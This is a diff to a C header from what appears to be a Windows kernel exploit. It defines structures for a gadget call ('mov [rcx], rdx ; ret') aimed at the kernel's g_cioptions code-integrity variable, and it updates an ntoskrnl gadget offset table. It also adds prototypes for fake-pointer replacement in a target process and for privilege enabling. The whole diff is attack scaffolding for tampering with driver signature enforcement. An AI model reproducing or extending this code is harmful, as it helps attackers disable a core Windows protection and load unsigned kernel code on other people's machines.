@@ -43,10 +43,15 @@ typedef struct _OBJECT_NAME_INFORMATION {
     WCHAR                   NameBuffer[0];
 } OBJECT_NAME_INFORMATION, * POBJECT_NAME_INFORMATION;
 
-typedef struct _IPC_SET_FUNCTION_RETURN_PARAM {
+typedef struct _IPC_SET_FUNCTION_RETURN_DEEP_PARAMETER {
     UINT64 rip;         // gadget : mov [rcx], rdx ; ret
     UINT64 parameter;   // position: rcx --> &g_cioptions
-} IPC_SET_FUNCTION_RETURN_PARAM, * PIPC_SET_FUNCTION_RETURN_PARAM;
+} IPC_SET_FUNCTION_RETURN_DEEP_PARAMETER, * PIPC_SET_FUNCTION_RETURN_DEEP_PARAMETER;
+
+typedef struct _IPC_SET_FUNCTION_RETURN_PARAMETER {
+    PIPC_SET_FUNCTION_RETURN_DEEP_PARAMETER pInternalStruct;
+    UINT16 parameter;
+} IPC_SET_FUNCTION_RETURN_PARAMETER, * PIPC_SET_FUNCTION_RETURN_PARAMETER;
 
 typedef struct _REPLACEABLE_POINTER {
     LPWSTR Module;
@@ -105,7 +110,7 @@ static const ULONG NTOSKRNL_GADGET_OFFSET[] =
     0x00,
     0x00,
     0x00,
-    0x0262d9c
+    0x262d9c
 };
 
 
@@ -118,3 +123,4 @@ typedef HLOCAL      (WINAPI* PLOCALFREE) (__deref HLOCAL hMem);
 typedef int         (NTAPI* PWCSCMP)(const wchar_t* string1, const wchar_t* string2);
 
 LPVOID ReplaceFakePointers(HANDLE hProcess, LPVOID buffer, DWORD DataSize, PREPLACEABLE_POINTER pReplPointers, DWORD count);
+BOOL EnablePrivilege(LPWSTR SePrivilege);
